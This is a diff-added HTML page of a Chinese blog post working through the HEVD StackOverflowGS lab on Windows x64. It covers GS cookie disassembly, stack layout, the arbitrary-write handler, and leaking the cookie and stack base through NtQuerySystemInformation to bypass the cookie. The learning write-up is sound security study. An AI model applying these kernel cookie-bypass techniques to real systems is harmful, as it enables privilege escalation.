+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">86813</span>                 call    __security_check_cookie
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">86818</span>                 mov     rbx, [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">258</span>h<span style="color:#ff79c6">+</span>arg_10]
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">86820</span>                 add     rsp, <span style="color:#bd93f9">230</span>h
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">86827</span>                 pop     r15
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">86829</span>                 pop     r14
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">8682</span>B                 pop     r12
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">8682</span>D                 pop     rdi
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">8682</span>E                 pop     rsi
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">000000014008682F</span>                 retn
+</span></span></code></pre></div><p>GS: Cookie 用于在使用 <a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/gs-buffer-security-check?view=msvc-170">/GS（缓冲区安全检查）</a>编译的代码中和使用异常处理的代码中提供缓冲区溢出保护。 进入受到溢出保护的函数时，Cookie 被置于堆栈之上；退出时，会将堆栈上的值与全局 Cookie 进行比较。 它们之间存在任何差异则表示已经发生缓冲区溢出，并导致该程序的立即终止。</p>
+<p>这个var_38就是cookie的值，最后进行一个比较</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000023</span><span style="color:#bd93f9">8</span> KernelBuffer    db <span style="color:#bd93f9">512</span> dup(<span style="color:#ff79c6">?</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000003</span><span style="color:#bd93f9">8</span> var_38          dq <span style="color:#ff79c6">?</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000030</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000002F</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000002</span>E                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000002</span>D                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000002</span>C                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000002</span>B                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000002</span>A                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000002</span><span style="color:#bd93f9">9</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000002</span><span style="color:#bd93f9">8</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000027</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000026</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000025</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000024</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000023</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000022</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000021</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000020</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000001F</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000001</span>E                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000001</span>D                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000001</span>C                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000001</span>B                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000001</span>A                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000001</span><span style="color:#bd93f9">9</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000001</span><span style="color:#bd93f9">8</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000017</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000016</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000015</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000014</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000013</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000012</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000011</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000010</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000000F</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000000</span>E                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000000</span>D                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000000</span>C                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000000</span>B                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000000</span>A                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000000</span><span style="color:#bd93f9">9</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000000000000000</span><span style="color:#bd93f9">8</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000007</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000006</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000005</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000004</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000003</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000002</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0000000000000001</span>                 db <span style="color:#ff79c6">?</span> ; undefined
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0000000000000000</span>  r              db <span style="color:#bd93f9">8</span> dup(<span style="color:#ff79c6">?</span>)
+</span></span></code></pre></div><p>其初始化过程</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">86724</span>                 mov     rax, <span style="color:#8be9fd;font-style:italic">cs</span>:__security_cookie
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">8672</span>B                 xor     rax, rsp
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">8672</span>E                 mov     [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">258</span>h<span style="color:#ff79c6">+</span>var_38], rax
+</span></span></code></pre></div><p>绕过cookie的思路：</p>
+<ul>
+<li>在x86下可以通过修改 SEH 中的 exception handler 地址并触发异常来控制程序的执行流程。但是这个方法在这里并不可行，因为环境是 64 位系统，而只有 32 位系统的 SEH 信息保存在栈中，64 位系统的 SEH 不在栈上<a href="https://sup817ch.github.io/2020/09/04/Windows-x64-SEH%E7%AC%94%E8%AE%B0/">(1)</a>。因此无法使用 SEH 进行漏洞利用。</li>
+<li>修改 .data 和 栈上存储的 cookie 值。要做到这点，需要找到一个任意写漏洞，而 HEVD 显然是有这个漏洞的，就在 <code>TriggerArbitraryWrite</code> 函数中。除此之外，此次漏洞函数中还额外对 security_cookie 进行了一次栈顶的异或操作，因此还要获取栈顶的数值</li>
+<li>覆盖虚函数指针 条件：函数参数中有对象或结构体的指针；参数是放在栈上的。由于测试环境是 64 位系统，参数保存在寄存器中，因此不考虑。</li>
+<li>读取 cookie 数值并计算出 xored security_cookie 数值 需要一个任意读漏洞读取 cookie 的数值，以及想办法获取计算 xored security_cookie 时 RSP 寄存器的数值。</li>
+</ul>
+<p>如何获取rsp的值？</p>
+<p>首先利用 <code>NtQuerySystemInformation</code> 函数获取当前进程的 <code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code> 信息，该信息中包含了进程中每个线程的 StackBase 和 StackLimit 信息，StackBase 表示栈的起始地址，StackLimit 表示栈范围内可分配的最小地址，由于栈空间是向下分配的，因此 StackBase 的数值大于 StackLimit 的数值。</p>
+<p>what to where: 其实是任意地址读写。</p>
+<ul>
+<li>where内核地址，what写数据 =&gt; 任意写</li>
+<li>where是用户buffer，what是内核地址 =&gt; 任意读</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x22200B</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>	DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_ARBITRARY_WRITE ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>	FakeObjectNonPagedPoolNxIoctlHandler <span style="color:#ff79c6">=</span> ArbitraryWriteIoctlHandler(Irp, CurrentStackLocation);
+</span></span><span style="display:flex;"><span>	v7 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_ARBITRARY_WRITE ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">goto</span> LABEL_64;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">TriggerArbitraryWrite</span>(_WRITE_WHAT_WHERE <span style="color:#ff79c6">*</span>UserWriteWhatWhere)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">*</span>What; <span style="color:#6272a4">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">*</span>Where; <span style="color:#6272a4">// rdi
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  ProbeForRead(UserWriteWhatWhere, <span style="color:#bd93f9">0x10u</span>i64, <span style="color:#bd93f9">1u</span>);
+</span></span><span style="display:flex;"><span>  What <span style="color:#ff79c6">=</span> UserWriteWhatWhere<span style="color:#ff79c6">-&gt;</span>What;
+</span></span><span style="display:flex;"><span>  Where <span style="color:#ff79c6">=</span> UserWriteWhatWhere<span style="color:#ff79c6">-&gt;</span>Where;
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] UserWriteWhatWhere: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, UserWriteWhatWhere);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] WRITE_WHAT_WHERE Size: 0x%zX</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">0x10u</span>i64);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] UserWriteWhatWhere-&gt;What: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, What);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] UserWriteWhatWhere-&gt;Where: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, Where);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] Triggering Arbitrary Write</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>Where <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>What;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>i64;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>使用NtQuerySystemInformation(ZwQuerySystemInformation)获得内核信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>__kernel_entry NTSTATUS <span style="color:#50fa7b">NtQuerySystemInformation</span>(
+</span></span><span style="display:flex;"><span>  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
+</span></span><span style="display:flex;"><span>  [in, out]       PVOID                    SystemInformation,
+</span></span><span style="display:flex;"><span>  [in]            ULONG                    SystemInformationLength,
+</span></span><span style="display:flex;"><span>  [out, optional] PULONG                   ReturnLength
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p><code>SYSTEM_INFORMATION_CLASS</code>是一个枚举类型，<a href="https://blog.csdn.net/weixin_42270114/article/details/125803630">文章</a>存在这个结构体，我们关心如下的一个就行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">enum</span> <span style="color:#50fa7b">_SYSTEM_INFORMATION_CLASS</span> {
+</span></span><span style="display:flex;"><span>	SystemExtendedProcessInformation <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x39</span>
+</span></span><span style="display:flex;"><span>} SYSTEM_INFORMATION_CLASS;
+</span></span></code></pre></div><p><code>SystemInformation</code> 是查询结果</p>
+<p><code>SystemInformationLength</code>是SystemInformation缓冲区大小</p>
+<p><code>ReturnLength</code>返回实际大小，如果大于<code>SystemInformationLength</code>函数调用会失败</p>
+<p>相关利用：<a href="https://gist.github.com/TheWover/799822ce3d1239e0bd5764ac0b0adfda">List process information including process architecture and username</a></p>
+<p>查询的结果是 <code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_SYSTEM_EXTENDED_PROCESS_INFORMATION</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	ULONG NextEntryOffset;
+</span></span><span style="display:flex;"><span>	ULONG NumberOfThreads;
+</span></span><span style="display:flex;"><span>	LARGE_INTEGER SpareLi1;
+</span></span><span style="display:flex;"><span>	LARGE_INTEGER SpareLi2;
+</span></span><span style="display:flex;"><span>	LARGE_INTEGER SpareLi3;
+</span></span><span style="display:flex;"><span>	LARGE_INTEGER CreateTime;
+</span></span><span style="display:flex;"><span>	LARGE_INTEGER UserTime;
+</span></span><span style="display:flex;"><span>	LARGE_INTEGER KernelTime;
+</span></span><span style="display:flex;"><span>	UNICODE_STRING ImageName;
+</span></span><span style="display:flex;"><span>	KPRIORITY BasePriority;
+</span></span><span style="display:flex;"><span>	ULONG ProcessId;
+</span></span><span style="display:flex;"><span>	ULONG InheritedFromUniqueProcessId;
+</span></span><span style="display:flex;"><span>	ULONG HandleCount;
+</span></span><span style="display:flex;"><span>	ULONG SessionId;
+</span></span><span style="display:flex;"><span>	PVOID PageDirectoryBase;
+</span></span><span style="display:flex;"><span>	VM_COUNTERS VirtualMemoryCounters;
+</span></span><span style="display:flex;"><span>	SIZE_T PrivatePageCount;
+</span></span><span style="display:flex;"><span>	IO_COUNTERS IoCounters;
+</span></span><span style="display:flex;"><span>	SYSTEM_EXTENDED_THREAD_INFORMATION Threads[<span style="color:#bd93f9">1</span>];
+</span></span><span style="display:flex;"><span>} SYSTEM_EXTENDED_PROCESS_INFORMATION, <span style="color:#ff79c6">*</span> PSYSTEM_EXTENDED_PROCESS_INFORMATION;
+</span></span></code></pre></div><p>其中存在一个NumberOfThread的变量，我们可以遍历<code>SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1];</code>来获得StackBase和StackLimit</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_SYSTEM_EXTENDED_THREAD_INFORMATION</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    SYSTEM_THREAD_INFORMATION ThreadInfo;
+</span></span><span style="display:flex;"><span>    PVOID StackBase;
+</span></span><span style="display:flex;"><span>    PVOID StackLimit;
+</span></span><span style="display:flex;"><span>    PVOID Win32StartAddress;
+</span></span><span style="display:flex;"><span>    PVOID TebBase; <span style="color:#6272a4">// since VISTA
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    ULONG_PTR Reserved2;
+</span></span><span style="display:flex;"><span>    ULONG_PTR Reserved3;
+</span></span><span style="display:flex;"><span>    ULONG_PTR Reserved4;
+</span></span><span style="display:flex;"><span>} SYSTEM_EXTENDED_THREAD_INFORMATION, <span style="color:#ff79c6">*</span> PSYSTEM_EXTENDED_THREAD_INFORMATION;
+</span></span></code></pre></div><p>securityCookie在模块中的位置：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">data</span>:<span style="color:#bd93f9">0000000140003010</span> ; uintptr_t _security_cookie
+</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">data</span>:<span style="color:#bd93f9">0000000140003010</span> __security_cookie dq <span style="color:#bd93f9">2</span>B992DDFA232h 
+</span></span></code></pre></div><p>参考文章指出，每次触发驱动的 handler 函数时，一定会调用 <code>nt!NtDeviceIoControlFile</code> 函数，并且返回地址在 <code>nt!NtDeviceIoControlFile+0x56</code>。</p>
+<p>TriggerStackOverflow与获得栈的基址偏移是否相同？多跑几次</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>Python<span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">0xfffff88b1fdbf000</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0xfffff88b1fdc44b0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x54b0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Python<span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">0xfffff88b1dc8d000</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0xfffff88b1dc924b0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x54b0</span>
+</span></span></code></pre></div><p>看起来是一样的，因此我们直接获得rsp地址</p>
+<p>memmove时寄存器的值</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">RAX</span>: <span style="color:#bd93f9">0000000000000000</span>   <span style="color:#8be9fd;font-style:italic">RBX</span>: <span style="color:#bd93f9">0000000000000000</span>   <span style="color:#8be9fd;font-style:italic">RCX</span>: FFFFEC8EDD1724D0   
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">RDX</span>: <span style="color:#bd93f9">00000250870E0000</span>   <span style="color:#8be9fd;font-style:italic">RSI</span>: <span style="color:#bd93f9">000000000000000</span><span style="color:#bd93f9">8</span>   <span style="color:#8be9fd;font-style:italic">RDI</span>: <span style="color:#bd93f9">00000250870E0000</span>   
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">RIP</span>: FFFFF801211467E4   <span style="color:#8be9fd;font-style:italic">RSP</span>: FFFFEC8EDD1724B0   <span style="color:#8be9fd;font-style:italic">RBP</span>: FFFFAC01F21BCE50   
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">R8</span>:  <span style="color:#bd93f9">000000000000000</span><span style="color:#bd93f9">8</span>   <span style="color:#8be9fd;font-style:italic">R9</span>:  <span style="color:#bd93f9">000000000000004</span>D   <span style="color:#8be9fd;font-style:italic">R10</span>: <span style="color:#bd93f9">0000000000000000</span>   
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">R11</span>: FFFFEC8EDD1724A8   <span style="color:#8be9fd;font-style:italic">R12</span>: <span style="color:#bd93f9">0000000000000200</span>   <span style="color:#8be9fd;font-style:italic">R13</span>: FFFFAC01F2AC9E10   
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">R14</span>: <span style="color:#bd93f9">000000000000004</span>D   <span style="color:#8be9fd;font-style:italic">R15</span>: <span style="color:#bd93f9">0000000000000003</span> 
+</span></span></code></pre></div><p>如果直接写入，栈溢出触发Exception，直接崩溃</p>
+<ul>
+<li>缓冲区太大了（0x1000）后来把缓冲区该小一点(0x270)，发现是可以</li>
+</ul>
+<p>看了几篇文章，使用了修改页表的方式 bypass SMEP，有时间学习一下</p>
+<h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://github.com/vportal/HEVD">HEVD exploits for Windows 10</a></li>
+<li><a href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">HEVD Exploit - Stack OverflowGS on Windows 10</a></li>
+<li>[HEVD exploit 系列] StackOverflowGS](<a href="https://www.zoemurmure.top/posts/hevd_stackoberflowgs/">https://www.zoemurmure.top/posts/hevd_stackoberflowgs/</a>)</li>
+<li><a href="https://mp.weixin.qq.com/s/DuPFEdcRsFWU1VApOp5W0g">Windows x64 分页机制</a></li>
+</ul>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/windows">Windows</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		<div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        var disqus_shortname = 'ldrx30';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+
+</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © ldrx30 |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
